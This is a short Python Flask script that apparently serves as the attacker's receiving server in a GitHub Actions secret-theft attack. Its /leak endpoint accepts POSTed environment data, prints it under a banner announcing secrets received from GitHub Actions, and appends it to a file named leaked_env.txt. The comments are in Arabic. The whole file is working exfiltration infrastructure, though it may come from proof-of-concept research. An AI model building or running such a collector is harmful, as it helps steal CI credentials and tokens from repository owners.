from flask import Flask, request
import urllib.parse

app = Flask(__name__)

@app.route("/leak", methods=["POST"])
def leak():
    try:
        print("\n[🔥] Received secrets from GitHub Actions!\n")

        # فك تشفير البيانات لضمان عرضها بشكل صحيح
        decoded = urllib.parse.unquote_plus(request.data.decode())
        print(decoded)

        # حفظ البيانات في ملف لتوثيقها لاحقًا
        with open("leaked_env.txt", "a") as f:
            f.write(decoded + "\n" + "="*40 + "\n")

        return "✅ Secrets received and logged!\n"
    except Exception as e:
        return f"❌ Error: {e}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

